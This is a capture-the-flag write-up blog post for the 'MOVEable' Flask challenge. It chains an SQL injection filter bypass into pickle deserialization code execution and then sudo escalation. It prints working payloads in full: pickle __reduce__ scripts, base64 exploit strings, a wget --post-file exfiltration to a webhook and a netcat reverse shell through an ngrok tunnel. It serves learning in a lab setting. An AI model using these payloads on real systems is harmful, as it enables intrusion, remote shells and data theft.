---
layout: post
title:  "MOVEable Write Up"
categories: CTF
tags: Deserialization Python SSTI Flask SQLInjection
description: My write up for MOVEable CTF challenge
---
# Introduction

The goal is to find a flag, which is hidden somewhere 🤷‍♂️

In this write-up, I will describe all the steps and the way that I think to solve this challenge, so it will be a bit long. The purpose is for me to remember and I think it maybe helpful for some people, especially those are beginners like me.

**Challenge type:** White box

**Rule:** No brute-forcing

# Initial approach

Looks like the page just has a simple login page at first. When I tried to use some common credentials like `admin:admin` `admin:password`, none of them worked.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image.png>)


Dig into the source provided, we have the directory tree as below:

- app.py
- requirements.txt
- templates
    - login.html
    - files.html

I tried to directly access to files.html by adding `/files.html` in URL but it didn’t work.

# Hacker mode - ON

Since there is login function, so there might be `SQL Injection` exists in there. But how do we know if there is any filtering? 

Let’s dig into source code `app.py`, where the dev controls everything. We have the login function, which will initially call the `DBCLean` function to sanitize the input.

When the query successfully executed and there is result returned into `user` variable, it will continue to execute next query.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%201.png>)

Have a quick look on `DBClean` function, we can see that the developer considers these 3 characters: space  ``, single quote `'` and double quote `"` as `bad_char` and replace them with `blank`.

After that, the function will return the string and also replace `\` with single quote `'`.

Which indicates that we can make use of this `\` character to perform `SQL Injection` and we will use `tab` instead of `space` to avoid being sanitized.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%202.png>)

After this finding, I tried several SQL Injection payload like `\	OR	1=1	--	-` , `\	UNION	SELECT	1,2	--	-` but none of them worked. The result was just only Username or password is incorrect.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%203.png>)

Reading more on the function `executescript`, I know that it is able to handle multiple queries by separated with `;`. So I tried to use another query to insert fake credential `\;	INSERT	INTO	users	(username,password)	VALUES	(\hack\,\hack\);	--`	 

—> **FAILED**

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%204.png>)

So at that time, I thought that I will need to understand more on how the app process, so I tried to setup a Docker lab using the given `requirements.txt` file to explore the app’s behaviour.

> Here is where I learned to setup my Docker lab: [https://www.youtube.com/watch?v=twv_kCq693o](https://www.youtube.com/watch?v=twv_kCq693o)
For `database.db` file, I used `chinook.db` as sample file and added in `users` `activesessions` and `files` tables in.
> 

By running the app in local, I was able to modify the `flash("Username or password is incorrect")` to `flash(sql)` so that I can see the actual SQL query that it executed.

For other steps, I use `print('message',file=sys.stderr)` to print out in my local terminal for debugging.

![*Note: This is in my local environment*](<../assets/images/2024-11-02-MOVEable Write Up/image%205.png>)

*Note: This is in my local environment*

After seeing that nothing wrong with my query, I did a quick check on my Docker terminal with `sqlite3` —> Turned out that the query was executed successfully and the user was added in db.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%206.png>)

By doing more research, I found out the `executescript` actually **doesn’t return anything**, because it executes multiple queries, what should it return?

*Reference: [https://stackoverflow.com/questions/16697719/python-sqlite3-executescript-fails](https://stackoverflow.com/questions/16697719/python-sqlite3-executescript-fails)*

So, looks like the `if user:` statement is always `false`. 

**ON THE BRIGHT SIDE: W**e already knew that we are able to inject our own SQL query.

*Let’s dig more on which function that we can exploit!*

Another function caught my eyes was `download_file(filename, sessionid)` in the route `@app.route('/download/<filename>/<sessionid>', methods=['GET'])`

The way it uses `GET` method with parameters `filename` and `sessionid` without any sanitization made me think that we can input anything in there.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%207.png>)

Looking through the code, we can see it has the flow like below:

1. Select the `sessionid` in URL and check in table, if exists → Pass, else `'No active session found'` and return to homepage
2. After passing the session check, it will find the `filename` in `files` table. If exists, go to step 3. Else, `'File not found'` and back to `files` URL, which will also be redirected to homepage.
3. Once it found out the `filename` exists, it will use `pickle.loads` to read the Base64 decoded `file_data[0]` then try to send the file to user. If it fails to send, return `ERROR: Failed to retrieve file. Are you trying to hack us?!?`

**From this flow, we know that we need to have:**

1. A valid `session` which exists in `activesessions` table.
2. A valid file in `files` table.
3. File content need to me `pickle.dumpse` and `b64encode` as referring to `init_db()` function.

For first condition, we need to find out how the `session` is defined.

Checking in line 107: `session_id = str(uuid.uuid4())`

Looks like it use `uuid.uuid4()` to generate a session ID and also insert current `datetime` with format `%Y-%m-%d %H:%M:%S.%f'`

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%208.png>)

By applying these functions, I got the value for `session_id` and `timestamp`:

`session_id` = `9ecf7675-506c-448b-b032-9cd5178ea39e`

`timestamp` = `2024-10-28	19:36:15.667577`

For file’s content, I created my own Python script and use the same code as the dev to generate file content:

`(base64.b64encode(pickle.dumps(b'Some content here')).decode('utf-8'),))` —> `('gASVFQAAAAAAAABDEVNvbWUgY29udGVudCBoZXJllC4=',)`

At this point, I got 2 payloads:

1. Insert session: `\;	INSERT	INTO	activesessions	(sessionid,username,timestamp)	VALUES	(\9ecf7675-506c-448b-b032-9cd5178ea39e\,\someusername\,\2024-10-28	19:36:15.667577\);		--`   
2. Insert file: `\;	INSERT		INTO				files		VALUES	(\file1\,\gASVFQAAAAAAAABDEVNvbWUgY29udGVudCBoZXJllC4=\,	NULL);	--`	 

By adding them to login form in my local site, I see the payloads were executed successfully

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%209.png>)

Following the format of the route `/download/<filename>/<sessionid>`, I have the URL:

`http://localhost:5995/download/file1/9ecf7675-506c-448b-b032-9cd5178ea39e`

**BOOM!!! We got another error.** 

**—> Which means we successfully reached to** `pickle.loads` **function!!!**

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2010.png>)

**But now what?** I tried which many data content and file names, even some `../../../` for path traversal, but still got only 1 same error.

As a beginner, my knowledge is just limit to this stage, so…… I asked Copilot (why not? 😅)

From Copilot, I learned that `pickle.loads` mechanism is to **deserialize** data and can have **serious security risk** because of this deserialization function if user input arbitrary code.

Inside `pickle.loads`, there is magic method `__reduce__` will be called whenever deserialization happens.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2011.png>)

Copilot also provided me the Python script to generate payload to trick the `__reduce__` method to run OS Command.

Read more on the danger of pickle `__reduce__` method: [https://www.blackduck.com/blog/python-pickling.html#:~:text=Whenever an object is pickled,reconstruct this object when unpickling](https://www.blackduck.com/blog/python-pickling.html#:~:text=Whenever%20an%20object%20is%20pickled,reconstruct%20this%20object%20when%20unpickling).

```python
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ("<your_command_here>",))

payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(payload).decode('utf-8')

print(encoded_payload)
```

And now, I will try with `whoami` command first. I got the payload: `gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=`

Then I put it as a content of a file: `\;	INSERT	INTO	files	VALUES	(\file2\,\gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=\,	NULL);	--`	 

As I enter the URL with `file2` that I provided, in my terminal, I see the command return `root`. Which indicates that the OS Command was triggered.

![Screenshot 2024-10-30 at 16.40.52.png](<../assets/images/2024-11-02-MOVEable Write Up/Screenshot_2024-10-30_at_16.40.52.png>)

**BUT** the thing is, we don’t have terminal to read on that server….

So I’m thinking about using `curl` or `wget` to send the request to my Webhook.

As my docker doesn’t have `curl`, I used `ls / > /payload.txt; wget --post-file="/payload.txt” <webhook site>`

Payload: `gASViQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjG5scyAvID4gL3BheWxvYWQudHh0OyB3Z2V0IC0tcG9zdC1maWxlPSIvcGF5bG9hZC50eHQiIGh0dHBzOi8vd2ViaG9vay5zaXRlLzU1MjlhN2JlLTg1MzUtNGQ0ZS1hMWIxLWM2MjA5ZjA4YzAzMZSFlFKULg==`

Insert another file then run URL like above, I got the result returned in my webhook site

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2012.png>)

**BUT** (yes… another *but*) when I tried this payload on the real challenge, it didn’t return anything to my webhook, for both `curl` and `wget`.

I suspected that the server was configured to block the network to outside traffic, or might be that the dev didn’t install `curl` and `wget`. 

So I decided to try one more time with reverse shell. This time I use `ngrok` to create a TCP tunnel which links to my laptop using port `1343`. (Reference: [https://www.youtube.com/watch?v=RIEArLa7kEQ](https://www.youtube.com/watch?v=RIEArLa7kEQ))

Command: `ngrok tcp 1343`

![Executed from my laptop terminal](<../assets/images/2024-11-02-MOVEable Write Up/image%2013.png>)

Executed from my laptop terminal

Then also in my laptop, I opened another terminal and run `nc -lvp 1343` to listen for incoming request to my port `1343`.

For payload, I use OS command `nc 0.tcp.ap.ngrok.io 14308 -e sh` to run `sh` to my tunnel.

When the command was executed on server, in my terminal (where I was listening to the incoming request), there will be message informing me that there is connectiong coming

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2014.png>)

All I need to do now is just typing the command I want.

So basically, I’m remoting to the server.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2015.png>)

As I saw that it worked, I tried on the real challenge website. And once again… it failed :(

So I was pretty sure that the server blocked the network traffic to go outside.

**Let’s wrap it up a little bit**

1. We can use SQL Injection technique to insert whatever we want into db. Using `\` as `'` and `tab` for `space`.
2. We can modify the data to trick the `pickle` to run OS Command when it performs deserialization.

<aside>
❔

What we are missing is the place to show the OS Command output.

</aside>

As noticing the source code one more time, I saw that if the `send_file` function fails, it will send a `flash` message then the message will be output to HTML page.

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2016.png>)

**WHAT IF** we make use of the payload that tricks `pickle` to run OS Command to also manipulate the `flash` message, so it can output the OS Command result?

I know it sounds a bit crazy but I asked Copilot that question, then it actually gave me a scritp to do that … LOL

```python
import pickle
import base64

class InjectFlashMessage(object):
    def __reduce__(self):
        code = """
import subprocess
from flask import session
message = subprocess.check_output('OS-Command-Here', shell=True).decode('utf-8')
session['_flashes'] = [('error', message)]
"""
        return (exec, (code,))

payload = pickle.dumps(InjectFlashMessage())
encoded_payload = base64.b64encode(payload).decode('utf-8')

print("Fake flash: " + str(encoded_payload))
```

As I tried the command `ls /` —> **It worked!!!!!**

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2017.png>)

Now the only thing left is to find where the flag is!

I tried to look around in current directory —> nothing special.

Suspecting that the file is hidden in `root` directory, but when I ran the payload with OS command `ls /root`. There was **Internal Server Error**

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2018.png>)

There was something wrong but my payload hasn’t been changed anything except the command. So I suspected there is privilege issue.

So I ran `whoami` to see what is the current account.

Ok, current account is `moveable`. Maybe it doesn’t have `root` privilege

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2019.png>)

I tried to use `ls / -l` to list all files in `/` directory and found out there is `root` directory has configuration that only `root` can access `rwx` (read-write-execute), while others are `------` (no access at all)

![*Note: lsxxx is just my filename*](<../assets/images/2024-11-02-MOVEable Write Up/image%2020.png>)

*Note: lsxxx is just my filename*

After searching for a while, I found a way to use `sudo` just only in one line without waiting for input password in next line.

`echo "root-password" | sudo -S <command>`

I didn’t know the root password so I just tried the common one “root”

`echo "root" | sudo -S whoami`

And surprisingly… it worked!

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2021.png>)

so when I tried `echo "root" | sudo -S ls /root` 

Yep… It’s there!!!

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2022.png>)

What I needed to do left was `echo "root" | sudo -S cat /root/flag.txt`

**BINGO!!!**

![image.png](<../assets/images/2024-11-02-MOVEable Write Up/image%2023.png>)

This took me around 5 days to solve, it’s a special memory for a guy just have learned pentesting for more than 2 months like me. Hope you guys enjoy!
